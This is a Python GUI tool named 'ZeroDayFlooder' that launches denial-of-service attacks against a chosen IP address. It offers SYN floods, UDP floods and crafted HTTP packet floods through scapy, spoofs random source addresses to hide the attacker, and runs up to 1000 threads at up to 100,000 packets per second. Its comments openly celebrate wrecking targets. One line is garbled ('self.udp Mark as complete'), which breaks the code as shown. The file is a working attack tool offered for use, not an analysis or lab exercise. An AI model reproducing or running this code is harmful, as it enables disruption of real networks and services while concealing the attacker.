import tkinter as tk
from tkinter import messagebox
import scapy.all as scapy
from PIL import Image, ImageTk
import threading
import logging
import ipaddress
import time
import random
import string
import os
import socket

# Set up logging for all errors, no silent crashes
logging.basicConfig(filename='zerodayflooder.log', level=logging.ERROR, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Global event to control flood stop
stop_event = threading.Event()

class ZeroDayFlooder:
    def __init__(self, root):
        self.root = root
        self.root.title("ZeroDayFlooder - Kira's Wrath")
        self.root.geometry("600x600")
        
        # GUI elements for maximum chaos
        self.ip_label = tk.Label(root, text="Target IP:")
        self.ip_label.pack()
        self.ip_entry = tk.Entry(root)
        self.ip_entry.pack()
        
        self.port_label = tk.Label(root, text="Port (0 for random):")
        self.port_label.pack()
        self.port_entry = tk.Entry(root)
        self.port_entry.pack()
        
        self.threads_label = tk.Label(root, text="Thread Count:")
        self.threads_label.pack()
        self.threads_entry = tk.Entry(root)
        self.threads_entry.pack()
        
        self.rate_label = tk.Label(root, text="Flood Rate (packets/sec):")
        self.rate_label.pack()
        self.rate_entry = tk.Entry(root)
        self.rate_entry.pack()
        
        self.payload_label = tk.Label(root, text="Payload Size (bytes, UDP/HTTP):")
        self.payload_label.pack()
        self.payload_entry = tk.Entry(root)
        self.payload_entry.pack()
        
        # Protocol toggles for targeted destruction
        self.syn_var = tk.BooleanVar()
        self.udp Mark as complete
udp_var = tk.BooleanVar()
        self.http_var = tk.BooleanVar()
        tk.Checkbutton(root, text="SYN Flood", variable=self.syn_var).pack()
        tk.Checkbutton(root, text="UDP Blast", variable=self.udp_var).pack()
        tk.Checkbutton(root, text="HTTP Bomb", variable=self.http_var).pack()
        
        # Random port scan toggle
        self.random_port_var = tk.BooleanVar()
        tk.Checkbutton(root, text="Random Port Scan", variable=self.random_port_var).pack()
        
        self.status_bar = tk.Label(root, text="Ready to burn!", bd=1, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        self.start_button = tk.Button(root, text="Activate Flood", command=self.start_flood)
        self.start_button.pack()
        
        self.stop_button = tk.Button(root, text="Stop Flood", command=self.stop_flood, state=tk.DISABLED)
        self.stop_button.pack()
        
        # Load Kira's evil laugh
        self.image_label = tk.Label(root)
        self.image_label.pack()
        self.load_kira_image()
        
        self.threads = []
    
    def load_kira_image(self):
        # Load Kira's epic laugh or fallback
        try:
            img = Image.open("kira_laugh.png")
            self.kira_img = ImageTk.PhotoImage(img)
            self.image_label.config(image=self.kira_img)
            self.status_bar.config(text="Kira image loaded, ready to wreck!")
        except Exception as e:
            logging.error(f"Image load failed: {str(e)}")
            self.image_label.config(text="Kira Laugh (Image Failed)", font=("Arial", 20), fg="red")
            self.status_bar.config(text="Kira image failed, using fallback!")
    
    def validate_ip(self, ip):
        # Check if IP is valid
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError as e:
            logging.error(f"Invalid IP: {ip} - {str(e)}")
            messagebox.showerror("Error", f"Invalid IP: {ip}")
            return False
    
    def generate_random_ip(self):
        # Fake source IP to hide tracks
        try:
            return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        except Exception as e:
            logging.error(f"Random IP generation failed: {str(e)}")
            return "192.168.0.1"  # Fallback IP
    
    def generate_random_mac(self):
        # Random MAC for botnet simulation
        try:
            mac = [random.randint(0x00, 0xff) for _ in range(6)]
            return ":".join(f"{x:02x}" for x in mac)
        except Exception as e:
            logging.error(f"Random MAC generation failed: {str(e)}")
            return "00:00:00:00:00:00"  # Fallback MAC
    
    def check_network(self):
        # Check network interface and permissions
        try:
            socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            return True
        except (socket.error, PermissionError, OSError) as e:
            logging.error(f"Network check failed: {str(e)}")
            messagebox.showerror("Error", "Network fail: Check interface or run as root!")
            return False
    
    def syn_flood(self, ip, port, rate):
        # SYN flood with spoofed IP and mutated headers
        try:
            delay = 1.0 / max(1, rate)
            while not stop_event.is_set():
                src_ip = self.generate_random_ip()
                ttl = random.randint(64, 255)
                port = random.randint(1, 65535) if self.random_port_var.get() else port
                pkt = scapy.IP(src=src_ip, dst=ip, ttl=ttl)/scapy.TCP(dport=port, flags="S", sport=random.randint(1024, 65535))
                scapy.send(pkt, verbose=False)
                time.sleep(delay)
        except (socket.error, PermissionError, OSError) as e:
            logging.error(f"SYN flood network error: {str(e)}")
            self.status_bar.config(text="SYN flood failed: Network issue!")
        except Exception as e:
            logging.error(f"SYN flood general error: {str(e)}")
            self.status_bar.config(text="SYN flood crashed!")
    
    def udp_blast(self, ip, port, rate, payload_size):
        # UDP blast with spoofed IP, MAC, and custom payload
        try:
            delay = 1.0 / max(1, rate)
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=payload_size)).encode()
            while not stop_event.is_set():
                src_ip = self.generate_random_ip()
                ttl = random.randint(64, 255)
                port = random.randint(1, 65535) if self.random_port_var.get() else port
                pkt = scapy.IP(src=src_ip, dst=ip, ttl=ttl)/scapy.UDP(dport=port, sport=random.randint(1024, 65535))/payload
                scapy.send(pkt, verbose=False)
                time.sleep(delay)
        except (socket.error, PermissionError, OSError) as e:
            logging.error(f"UDP blast network error: {str(e)}")
            self.status_bar.config(text="UDP blast failed: Network issue!")
        except Exception as e:
            logging.error(f"UDP blast general error: {str(e)}")
            self.status_bar.config(text="UDP blast crashed!")
    
    def http_bomb(self, ip, port, rate, payload_size):
        # HTTP bomb with spoofed IP and mutated headers
        try:
            delay = 1.0 / max(1, rate)
            payload = f"GET / HTTP/1.1\r\nHost: target\r\n{'A' * payload_size}\r\n\r\n".encode()
            while not stop_event.is_set():
                src_ip = self.generate_random_ip()
                ttl = random.randint(64, 255)
                port = random.randint(80, 8080) if self.random_port_var.get() else port
                pkt = scapy.IP(src=src_ip, dst=ip, ttl=ttl)/scapy.TCP(dport=port, flags="PA", sport=random.randint(1024, 65535))/payload
                scapy.send(pkt, verbose=False)
                time.sleep(delay)
        except (socket.error, PermissionError, OSError) as e:
            logging.error(f"HTTP bomb network error: {str(e)}")
            self.status_bar.config(text="HTTP bomb failed: Network issue!")
        except Exception as e:
            logging.error(f"HTTP bomb general error: {str(e)}")
            self.status_bar.config(text="HTTP bomb crashed!")
    
    def start_flood(self):
        # Validate inputs and unleash hell
        ip = self.ip_entry.get()
        try:
            port = int(self.port_entry.get() or 0)
            threads = int(self.threads_entry.get())
            rate = int(self.rate_entry.get())
            payload_size = int(self.payload_entry.get() or 1000)
            
            # Enhanced validation
            if port < 0 or (port > 65535 and port != 0):
                raise ValueError("Port must be 0-65535 or 0 for random!")
            if threads < 1 or threads > 1000:
                raise ValueError("Threads must be 1-1000!")
            if rate < 1 or rate > 100000:
                raise ValueError("Rate must be 1-100000 packets/sec!")
            if payload_size < 1 or payload_size > 65535:
                raise ValueError("Payload size must be 1-65535 bytes!")
        except ValueError as e:
            logging.error(f"Invalid input: {str(e)}")
            messagebox.showerror("Error", f"Invalid input: {str(e)}")
            return
        
        if not self.validate_ip(ip):
            return
        
        if not (self.syn_var.get() or self.udp_var.get() or self.http_var.get()):
            messagebox.showerror("Error", "Select at least one attack type!")
            return
        
        # Check network before launch
        if not self.check_network():
            return
        
        stop_event.clear()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.status_bar.config(text=f"Wrecking {ip}:{port} with {threads} threads at {rate} pkt/s, payload {payload_size} bytes!")
        
        # Start selected attacks with thread error handling
        self.threads = []
        attacks = []
        if self.syn_var.get():
            attacks.append(self.syn_flood)
        if self.udp_var.get():
            attacks.append(lambda ip, port, rate: self.udp_blast(ip, port, rate, payload_size))
        if self.http_var.get():
            attacks.append(lambda ip, port, rate: self.http_bomb(ip, port, rate, payload_size))
        
        try:
            for _ in range(threads):
                for attack in attacks:
                    t = threading.Thread(target=attack, args=(ip, port, rate))
                    t.start()
                    self.threads.append(t)
        except threading.ThreadError as e:
            logging.error(f"Thread creation failed: {str(e)}")
            messagebox.showerror("Error", "Failed to create threads!")
            self.stop_flood()
    
    def stop_flood(self):
        # Stop all floods without a trace
        try:
            stop_event.set()
            for t in self.threads:
                t.join(timeout=5)  # Timeout to avoid hanging
                if t.is_alive():
                    logging.error("Thread did not stop properly")
                    self.status_bar.config(text="Warning: Some threads didn't stop!")
            self.threads = []
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.status_bar.config(text="Flood stopped, target still breathing... for now!")
        except Exception as e:
            logging.error(f"Stop flood error: {str(e)}")
            self.status_bar.config(text="Error stopping flood!")

if __name__ == "__main__":
    try:
        root = tk.Tk()
        app = ZeroDayFlooder(root)
        root.mainloop()
    except Exception as e:
        logging.error(f"App crashed: {str(e)}")
        messagebox.showerror("Crash", "App failed to launch!")
